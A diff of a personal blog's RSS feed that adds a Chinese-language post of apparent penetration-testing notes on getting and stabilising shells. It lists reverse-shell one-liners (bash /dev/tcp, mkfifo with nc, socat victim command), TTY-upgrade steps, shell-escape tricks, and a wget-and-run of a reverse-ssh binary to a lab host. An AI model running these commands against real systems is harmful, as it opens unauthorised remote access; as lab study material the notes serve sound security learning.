@@ -1,5 +1,81 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>dehua</title><link>https://dehua-rd.github.io</link><description>The cloud is just someone else’s computer.</description><copyright>dehua</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/154585050?v=4</url><title>avatar</title><link>https://dehua-rd.github.io</link></image><lastBuildDate>Sat, 05 Jul 2025 07:08:07 +0000</lastBuildDate><managingEditor>dehua</managingEditor><ttl>60</ttl><webMaster>dehua</webMaster><item><title>Tryharder</title><link>https://dehua-rd.github.io/post/Tryharder.html</link><description># Tryharder
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>dehua</title><link>https://dehua-rd.github.io</link><description>The cloud is just someone else’s computer.</description><copyright>dehua</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/154585050?v=4</url><title>avatar</title><link>https://dehua-rd.github.io</link></image><lastBuildDate>Tue, 08 Jul 2025 16:35:16 +0000</lastBuildDate><managingEditor>dehua</managingEditor><ttl>60</ttl><webMaster>dehua</webMaster><item><title>shell相关</title><link>https://dehua-rd.github.io/post/shell-xiang-guan.html</link><description>## 交互shell
+`rlwrap -cAr nc -lvnp 1234`
+&gt;rlwrap: 为命令行提供 readline 功能（历史记录、行编辑等）
+&gt;-c: 启用命令完成
+&gt;-A: 自动完成文件名
+&gt;-r: 记住输入历史
+
+## 升级完全shell
+`python3 -c 'import pty;pty.spawn('/bin/bash')'`
+&gt;使用 Python 生成一个伪终端 (pty) 并启动 bash
+&gt;伪终端模拟了真实终端的特性，包括:
+&gt;行缓冲(Line buffering)
+&gt;信号处理(Signal handling)
+&gt;作业控制(Job control)
+&gt;这使Shell获得终端特性(TTY特性)
+
+`export SHELL=bash`
+&gt;设置正确的Shell环境变量
+&gt;确保系统知道当前使用的是Bash
+&gt;影响某些应用程序的Shell调用行为
+
+`export TERM=xterm-256color` 
+&gt;设置终端类型
+&gt;使Shell支持:
+&gt;高级终端功能
+&gt;颜色显示
+&gt;特殊按键响应
+
+**ctrl+z**
+&gt;作用：挂起当前Shell进程
+&gt;发送SIGTSTP信号
+&gt;为后续终端设置做准备
+
+`stty raw -echo;fg`
+&gt;配置终端原始模式
+&gt;raw模式：禁用输入处理，直接传递原始数据
+&gt;-echo：禁用回显(避免双重回显)
+&gt;fg：将挂起的进程带回前台
+
+`reset`
+&gt;作用：重置终端设置
+&gt;清除可能的错误配置
+&gt;确保终端处于干净状态
+&gt;重新初始化终端驱动
+
+## socat
+#### Listener:
+`socat file:`tty`,raw,echo=0 tcp-listen:4444`
+#### Victim:
+`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444`
+
+
+
+## 反向shell
+`bash -i &gt;&amp; /dev/tcp/$ip/$port 0&gt;&amp;1`
+不支持/dev/tcp
+`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 192.168.218.148 4444 &gt; /tmp/f`
+
+## 生成shell
+`python -c 'import pty; pty.spawn('/bin/sh')'`
+`echo os.system('/bin/bash')`
+`/bin/sh -i`
+`script -qc /bin/bash /dev/null`
+`perl -e 'exec '/bin/sh';'`
+`perl: exec '/bin/sh';`
+`ruby: exec '/bin/sh'`
+`lua: os.execute('/bin/sh')`
+`IRB: exec '/bin/sh'`
+`vi: :!bash`
+`vi: :set shell=/bin/bash:shell`
+`nmap: !sh`
+
+
+## 反向ssh
+#### 在目标机上使用
+`wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh &amp;&amp; chmod +x /dev/shm/reverse-ssh`
+`/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2`。</description><guid isPermaLink="true">https://dehua-rd.github.io/post/shell-xiang-guan.html</guid><pubDate>Tue, 08 Jul 2025 13:19:22 +0000</pubDate></item><item><title>Tryharder</title><link>https://dehua-rd.github.io/post/Tryharder.html</link><description># Tryharder
 
 &gt; 日期：2025-07-04 ｜ 作者：dehua ｜ 标签：hvm，jwt， LD_PRELOAD
 
